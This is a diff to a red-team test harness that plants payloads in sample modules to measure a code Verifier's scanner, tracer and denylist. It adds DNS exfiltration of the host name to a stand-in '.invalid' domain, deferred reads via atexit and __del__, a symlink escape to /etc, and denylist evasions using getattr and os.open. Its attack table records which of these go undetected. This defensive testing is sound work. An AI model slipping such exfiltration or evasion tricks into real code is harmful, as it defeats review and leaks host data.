@@ -276,7 +276,157 @@ def _resource_active(rng: random.Random) -> Payload:
                    detail="a non-terminating loop on import")
 
 
+# -- second wave: what the first campaign did not ask ------------------------
+
+
+def _net_dns_exfil(rng: random.Random) -> Payload:
+    # Exfiltration with no connection at all: the secret rides out in the name
+    # being resolved. A rule watching for connect() would see nothing.
+    marker = rng.randrange(1_000_000)
+    code = (
+        "def _report_install() -> None:\n"
+        "    import socket\n"
+        "    try:\n"
+        '        with open("/etc/hostname", "r", encoding="utf-8") as handle:\n'
+        '            label = handle.read().strip().replace(".", "-")[:32] or "none"\n'
+        "    except OSError:\n"
+        '        label = "none"\n'
+        "    try:\n"
+        f'        socket.getaddrinfo(f"{{label}}-{marker}.telemetry.invalid", 80)\n'
+        "    except OSError:\n"
+        "        pass\n\n\n"
+        "_report_install()\n"
+    )
+    return Payload(("inventory.py",), {"inventory.py": inject_module_scope(SAMPLES["inventory.py"], code)},
+                   detail="encodes the host name into a DNS lookup -- exfiltration with no connection")
+
+
+def _atexit_payload(rng: random.Random) -> Payload:
+    # Fires after the test suite has finished. Deliberately a *read*, so the
+    # static scan stays silent and the only thing that can catch it is the
+    # tracer still being installed and still flushing at interpreter exit.
+    code = (
+        "import atexit\n\n\n"
+        "def _final_sweep() -> None:\n"
+        "    try:\n"
+        '        with open("/etc/hostname", "r", encoding="utf-8") as handle:\n'
+        "            handle.read()\n"
+        "    except OSError:\n"
+        "        pass\n\n\n"
+        "atexit.register(_final_sweep)\n"
+    )
+    return Payload(("textkit.py",), {"textkit.py": inject_module_scope(SAMPLES["textkit.py"], code)},
+                   detail="defers a host-file read to interpreter exit, after the tests are done")
+
+
+def _finalizer_payload(rng: random.Random) -> Payload:
+    # Same question as atexit, asked through the garbage collector instead.
+    #
+    # The object is created *and dropped* during import, so refcounting fires
+    # __del__ there and then. An earlier version kept it alive as a module
+    # global, which meant the finalizer only ran during interpreter shutdown --
+    # by which point builtins are torn down and the body died on
+    # "NameError: name 'open' is not defined". That attack never executed at
+    # all, and an attack that does not execute must not be scored as one the
+    # Verifier missed.
+    code = (
+        "class _Sweeper:\n"
+        "    def __del__(self) -> None:\n"
+        "        try:\n"
+        '            with open("/etc/hostname", "r", encoding="utf-8") as handle:\n'
+        "                handle.read()\n"
+        "        except OSError:\n"
+        "            pass\n\n\n"
+        "def _cycle() -> None:\n"
+        "    sweeper = _Sweeper()\n"
+        "    del sweeper\n\n\n"
+        "_cycle()\n"
+    )
+    return Payload(("inventory.py",), {"inventory.py": inject_module_scope(SAMPLES["inventory.py"], code)},
+                   detail="hides a host-file read in a __del__ finalizer, triggered during the run")
+
+
+def _getattr_dormant(rng: random.Random) -> Payload:
+    # The dotted-name walk can only match a name that appears. Build it at
+    # runtime and there is nothing in the AST to match -- and `getattr` is far
+    # too ordinary to denylist. Dormant, so the tracer never sees it either.
+    code = (
+        '_VERB = "rem" + "ove"\n\n\n'
+        "def _purge(target: str) -> None:\n"
+        "    import os\n"
+        "    getattr(os, _VERB)(target)\n"
+    )
+    return Payload(("textkit.py",), {"textkit.py": inject_dead_code(SAMPLES["textkit.py"], code)},
+                   detail="a never-called deleter whose os.remove is assembled at runtime")
+
+
+def _os_open_dormant(rng: random.Random) -> Payload:
+    # The denylist learned `open(..., "w")` and pathlib. The low-level door is
+    # still open, which is the point: a denylist is whack-a-mole by construction.
+    code = (
+        "def _write_raw(target: str, blob: bytes) -> None:\n"
+        "    import os\n"
+        "    handle = os.open(target, os.O_WRONLY | os.O_CREAT)\n"
+        "    try:\n"
+        "        os.write(handle, blob)\n"
+        "    finally:\n"
+        "        os.close(handle)\n"
+    )
+    return Payload(("inventory.py",), {"inventory.py": inject_dead_code(SAMPLES["inventory.py"], code)},
+                   detail="a never-called writer using os.open, one rung below the denylist")
+
+
+def _slow_no_timeout(rng: random.Random) -> Payload:
+    # Twenty times slower, and entirely legal: the wall-clock rule only fires at
+    # the ceiling, and nothing compares this run against the previous one.
+    code = (
+        "def _warm_caches() -> None:\n"
+        "    import time\n"
+        "    deadline = time.monotonic() + 6.0\n"
+        "    spins = 0\n"
+        "    while time.monotonic() < deadline:\n"
+        "        spins += 1\n\n\n"
+        "_warm_caches()\n"
+    )
+    return Payload(("textkit.py",), {"textkit.py": inject_module_scope(SAMPLES["textkit.py"], code)},
+                   detail="burns six seconds on import -- slow, but well inside the ceiling")
+
+
+def _symlink_escape(rng: random.Random) -> Payload:
+    # Reach outside the workspace without ever naming a path outside it.
+    code = (
+        "def _link_cache() -> None:\n"
+        "    import os\n"
+        "    here = os.path.dirname(os.path.abspath(__file__))\n"
+        '    link = os.path.join(here, "cache_dir")\n'
+        "    try:\n"
+        '        os.symlink("/etc", link)\n'
+        "    except (OSError, NotImplementedError, AttributeError):\n"
+        "        pass\n\n\n"
+        "_link_cache()\n"
+    )
+    return Payload(("inventory.py",), {"inventory.py": inject_module_scope(SAMPLES["inventory.py"], code)},
+                   detail="plants a symlink from inside the workspace to /etc")
+
+
 # -- benign probes: legitimate edits that should NOT be flagged ---------------
+
+
+def _benign_pathlib_read(rng: random.Random) -> Payload:
+    # The control for widening the denylist. Path.read_text is a perfectly
+    # ordinary thing for library code to do; if closing the write gaps made
+    # reads noisy, this is where it shows up as a false positive.
+    code = (
+        "def load_banner(path: str) -> str:\n"
+        '    """Read an optional banner file and normalise its whitespace."""\n'
+        "    from pathlib import Path\n\n"
+        "    candidate = Path(path)\n"
+        "    if not candidate.is_file():\n"
+        '        return ""\n'
+        '    return normalize_whitespace(candidate.read_text(encoding="utf-8"))\n'
+    )
+    return Payload(("textkit.py",), {"textkit.py": inject_dead_code(SAMPLES["textkit.py"], code)},
+                   detail="adds a helper that reads a file with pathlib -- legitimate, and must stay quiet")
 
 
 def _benign_helper(rng: random.Random) -> Payload:
@@ -339,6 +489,23 @@ ATTACKS: tuple[Attack, ...] = (
     Attack("resource-loop", "resource", "runs during tests", "planted", ("runtime.timeout",), CAUGHT,
            "A non-terminating loop. Stopped by the wall-clock ceiling.", _resource_active),
 
+    # Second wave. Each of these asks a question the first campaign did not.
+    Attack("net-dns-exfil", "network", "resolution only", "planted", ("net.egress",), CAUGHT,
+           "Data leaves in the name being resolved. Watching for connect() alone would miss it.", _net_dns_exfil),
+    Attack("atexit-payload", "lifecycle", "after the tests", "planted", ("fs.escape_read",), CAUGHT,
+           "Runs at interpreter exit. Asks whether observation outlives the test run.", _atexit_payload),
+    Attack("finalizer-payload", "lifecycle", "garbage collector", "planted", ("fs.escape_read",), CAUGHT,
+           "Runs from __del__. Asks whether collection-time work is observed at all.", _finalizer_payload),
+    Attack("symlink-escape", "filesystem", "runs during tests", "planted", ("code.dangerous_construct",), CAUGHT,
+           "Reaches outside the workspace without naming a path outside it.", _symlink_escape),
+
+    Attack("getattr-dormant", "filesystem", "name built at runtime", "planted", (), GAP,
+           "The dangerous name never appears in the AST, and the code never runs. Nothing can see it.", _getattr_dormant),
+    Attack("os-open-dormant", "filesystem", "below the denylist", "planted", (), GAP,
+           "os.open is one rung under the names the scan knows. A denylist is whack-a-mole.", _os_open_dormant),
+    Attack("slow-no-timeout", "performance", "under the ceiling", "planted", (), GAP,
+           "Twenty times slower and entirely legal: nothing compares this run against the last.", _slow_no_timeout),
+
     # These four were gaps on the first campaign and are now closed: the static
     # denylist learned pathlib's mutators, shutil's copiers and a writing open(),
     # and the oracle rule learned that a skip silences a test as surely as a
@@ -367,6 +534,8 @@ ATTACKS: tuple[Attack, ...] = (
            "Benign code full of socket/system/exec as identifiers -- a keyword filter's trap.", _benign_scary_names),
     Attack("benign-refactor", "benign", "clean", "benign", (), CAUGHT,
            "A large behaviour-preserving rewrite -- the probe for rules keying off diff size.", _benign_big_refactor),
+    Attack("benign-pathlib-read", "benign", "clean", "benign", (), CAUGHT,
+           "Reads a file with pathlib. The control for having widened the denylist.", _benign_pathlib_read),
 )
 
 
